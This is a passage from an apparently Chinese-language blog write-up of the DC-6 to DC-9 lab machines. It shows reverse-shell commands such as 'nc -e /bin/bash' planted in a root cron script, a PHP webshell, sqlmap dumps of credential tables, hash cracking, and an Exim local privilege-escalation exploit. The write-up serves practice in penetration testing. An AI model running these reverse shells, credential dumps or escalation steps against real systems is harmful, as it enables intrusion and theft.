YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-7渗透过程"><a href="#DC-7渗透过程" class="headerlink" title="DC-7渗透过程"></a><strong>DC-7渗透过程</strong></h2><p>这次的靶机渗透和以往的思路不太一样，也算拓展了思维。网站给了个提示，Google下发现了数据库文件。</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.jpg" alt></p>
<p>发现了数据库信息，ssh连接登陆成功！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$servername = <span class="string">"localhost"</span>;</span><br><span class="line">	$username = <span class="string">"dc7user"</span>;</span><br><span class="line">	$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br><span class="line">				MdR3xOgB7<span class="comment">#dw</span></span><br><span class="line">	$dbname = <span class="string">"Staff"</span>;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>登陆后，提示我们有一封邮件，打开发现是一个定期执行的脚本，具体查看该脚本权限，发现拥有root权限，只要在其中加入反弹shell命令，就可以提权！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/mail<span class="variable">$</span> cat dc7user </span><br><span class="line">To: root@dc<span class="literal">-7</span></span><br><span class="line">Subject: Cron &lt;root@dc<span class="literal">-7</span>&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME<span class="literal">-Version</span>: <span class="number">1.0</span></span><br><span class="line">Content<span class="literal">-Type</span>: text/plain; charset=UTF<span class="literal">-8</span></span><br><span class="line">Content<span class="literal">-Transfer</span><span class="literal">-Encoding</span>: <span class="number">8</span>bit</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;HOME=/root&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;LOGNAME=root&gt;</span><br><span class="line">Message<span class="literal">-Id</span>: &lt;E1kJBmQ<span class="literal">-0000IC</span><span class="literal">-5x</span>@dc<span class="literal">-7</span>&gt;</span><br><span class="line">Date: Fri, <span class="number">18</span> Sep <span class="number">2020</span> <span class="number">18</span>:<span class="number">30</span>:<span class="number">06</span> +<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [<span class="type">success</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看定时计划内容</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cat backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql<span class="literal">-dump</span> -<span class="literal">-result</span><span class="operator">-file</span>=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar <span class="literal">-czf</span> /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.sql</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span> <span class="comment">#这是后来我加上去的，反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意这里有一个drush命令，是用来管理drupal站点的shell，这里可以修改下密码</span></span><br><span class="line"><span class="comment">#注意需要切换到此目录下才可以成功执行</span></span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cd /var/www/html</span><br><span class="line">cd /var/www/html</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/www/html<span class="variable">$</span> drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin                                           [<span class="type">success</span>]</span><br></pre></td></tr></table></figure>

<p><strong>进入后台以后，需要先安装下php fiter 以便后续反弹shell，drupal 7 是自带的，8版本删去了 ，在extend下，先导入</strong></p>
<p><strong><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a> 下的安装包，然后下拉找到php fiter 点击再安装。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/9.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.png" alt></p>
<p><strong>然后在add content 下 add basic page ，然后写入webshell  本地监听，反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/10.png" alt></p>
<p><strong>连接成功以后，将反弹shell命令写入backups.sh中，再次反弹，得到root权限，查看flag！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span></span><br><span class="line"><span class="comment">#&lt;?php system('nc -e  /bin/bash 192.168.126.33 1234'?&gt;</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># pwd</span></span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">theflag.txt</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># cat theflag.txt</span></span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I'm sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-8渗透过程"><a href="#DC-8渗透过程" class="headerlink" title="DC-8渗透过程"></a><strong>DC-8渗透过程</strong></h2><p> <strong>whatweb查看网站指纹信息，发现是drupal 7系统，和之前一样看看能否利用漏洞，发现不太行，不过发现网站存在sql注入漏洞，用sqlmap进行爆破，得到账号和密码，但是hash密码需要用john进行破解，需要特别久的时间才可以跑出来！</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">爆库、爆表、爆字段</span></span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" --current-db</span><br><span class="line">current database: 'd7db'</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users --columns</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users -C name,pass --dump</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">rockyou密码本实在长，需要跑很久很久</span></span><br><span class="line">root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>

<p><strong>一开始不太理解为什么选择这里插入，大概就是想办法在后台找到可以插入php语句，并且能够执行的地方，本地监听端口，成功反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.jpg" alt></p>
<p><strong>寻找相关命令是否可以提权，发现了可疑的exim4，寻找相关exp发现了有许多漏洞，查看exim4的版本，这里选取46996.sh作为提权文件，正常情况下是得一个个试过去，这里就不尝试了，然后修改exp的换行符，再上传到靶机中去，需要注意的是，要给文件增加一个可执行权限，且只有在/tmp下才可以传输文件！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span>  f  <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> /usr/sbin/exim4 -<span class="literal">-version</span></span><br><span class="line">Exim version <span class="number">4.89</span> </span><br><span class="line"></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改换行符，因为在windows下执行过</span></span><br><span class="line">vi <span class="number">46996</span>.sh</span><br><span class="line">:%s/^M//g</span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line"><span class="comment">#主机开启python -m SimpleHTTPServer 9001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机下载脚本</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">-<span class="literal">-2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span class="number">15</span>:<span class="number">09</span>--  http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3706</span> (<span class="number">3.6</span>K) [<span class="type">text</span>/<span class="type">x</span>-<span class="type">sh</span>]</span><br><span class="line">Saving to: <span class="string">'46996.sh'</span></span><br><span class="line"></span><br><span class="line"><span class="number">46996</span>.sh            <span class="number">100</span>%[===================&gt;]   <span class="number">3.62</span>K  --.<span class="literal">-KB</span>/s    <span class="keyword">in</span> <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span class="number">15</span>:<span class="number">09</span> (<span class="number">23.1</span> MB/s) - <span class="string">'46996.sh'</span> saved [<span class="number">3706</span>/<span class="number">3706</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本提权</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> ./run.sh <span class="literal">-m</span> netcat</span><br><span class="line">./run.sh <span class="literal">-m</span> netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">"The Return of the WIZard"</span> LPE exploit</span><br><span class="line">Copyright (c) <span class="number">2019</span> Marco Ivaldi &lt;raptor@<span class="number">0</span>xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line"><span class="number">220</span> dc<span class="literal">-8</span> ESMTP Exim <span class="number">4.89</span> Sat, <span class="number">19</span> Sep <span class="number">2020</span> <span class="number">13</span>:<span class="number">29</span>:<span class="number">30</span> +<span class="number">1000</span></span><br><span class="line"><span class="number">250</span> dc<span class="literal">-8</span> Hello localhost.lan [::<span class="number">1</span>]</span><br><span class="line"><span class="number">250</span> OK</span><br><span class="line"><span class="number">250</span> Accepted</span><br><span class="line"><span class="number">354</span> Enter message, ending with <span class="string">"."</span> on a line by itself</span><br><span class="line"><span class="number">250</span> OK id=<span class="number">1</span>kJTZ4<span class="literal">-0000Or</span><span class="literal">-UC</span></span><br><span class="line"><span class="number">221</span> dc<span class="literal">-8</span> closing connection</span><br><span class="line"></span><br><span class="line">Waiting <span class="number">5</span> seconds...</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">localhost <span class="function">[<span class="number">127.0</span><span class="type">.0.1</span>] 31337 (?) <span class="title">open</span></span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P</span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span></span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-9渗透过程"><a href="#DC-9渗透过程" class="headerlink" title="DC-9渗透过程"></a><strong>DC-9渗透过程</strong></h2><p><strong>进入首页，查看输入的地方，发现存在sql注入，burp抓包然后丢入sqlmap进行爆破，在user表下发现的用户密码没什么用，查看另一个表，发现了admin，密码是md5加密，可以用自带的密码本爆破出来</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat dc-9</span></span><br><span class="line">POST /results.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">68.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">68.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept<span class="literal">-Language</span>: en<span class="literal">-US</span>,en;q=<span class="number">0.5</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span>.<span class="number">126.159</span>/search.php</span><br><span class="line">Content<span class="literal">-Type</span>: application/x<span class="literal">-www</span><span class="literal">-form</span><span class="literal">-urlencoded</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">8</span></span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=<span class="number">9</span>sb365ben06it8fk0hu3bngrc3</span><br><span class="line">Upgrade<span class="literal">-Insecure</span><span class="literal">-Requests</span>: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">search=<span class="number">1</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -dbs</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C id,username,password --dump</span></span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[<span class="number">17</span> <span class="type">entries</span>]</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |   </span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| <span class="number">1</span>  | marym     | <span class="number">3</span>kfs86sfd     |</span><br><span class="line">| <span class="number">2</span>  | julied    | <span class="number">468</span>sfdfsd2    |</span><br><span class="line">| <span class="number">3</span>  | fredf     | <span class="number">4</span>sfd87sfd1    |</span><br><span class="line">| <span class="number">4</span>  | barneyr   | RocksOff      |</span><br><span class="line">| <span class="number">5</span>  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| <span class="number">6</span>  | jerrym    | B8m<span class="comment">#48sd      |</span></span><br><span class="line">| <span class="number">7</span>  | wilmaf    | Pebbles       |</span><br><span class="line">| <span class="number">8</span>  | bettyr    | BamBam01      |</span><br><span class="line">| <span class="number">9</span>  | chandlerb | UrAG0D!       |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D Staff -T Users -C  Username,Password --dump</span></span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [<span class="type">y</span>/<span class="type">N</span>] y</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting dictionary<span class="literal">-based</span> cracking (md5_generic_passwd)</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting <span class="number">4</span> processes </span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">49</span>] [<span class="type">INFO</span>] <span class="keyword">using</span> suffix <span class="string">'1'</span>                                                                                       </span><br><span class="line">[<span class="number">12</span>:<span class="number">07</span>:<span class="number">16</span>] [<span class="type">INFO</span>] cracked password <span class="string">'transorbital1'</span> <span class="keyword">for</span> user <span class="string">'admin'</span>                                                                </span><br><span class="line">Database: Staff                                                                                                                    </span><br><span class="line">Table: Users</span><br><span class="line">[<span class="number">1</span> <span class="type">entry</span>]</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| Username | Password                                         |</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| admin    | <span class="number">856</span>f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>登陆后台，提示了文件不存在，可能存在文件包含漏洞。构造payload成功猜解出file关键词，但是和之前的不太一样，不能查看其它文件，没法写入，看了其它人的思路，后台存有/etc/knockd.conf文件，结合之前扫描出的22端口是关闭状态，knockd可以对SSH进行防护。这里意思是端口敲门，需要按照顺序‘敲’端口，如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/152.png" alt></p>
<p><strong>依次nc连接目标端口，22端口成功打开！然后利用之前爆破出的用户名和密码，进行ssh连接尝试，得到3个成功用户！</strong></p>
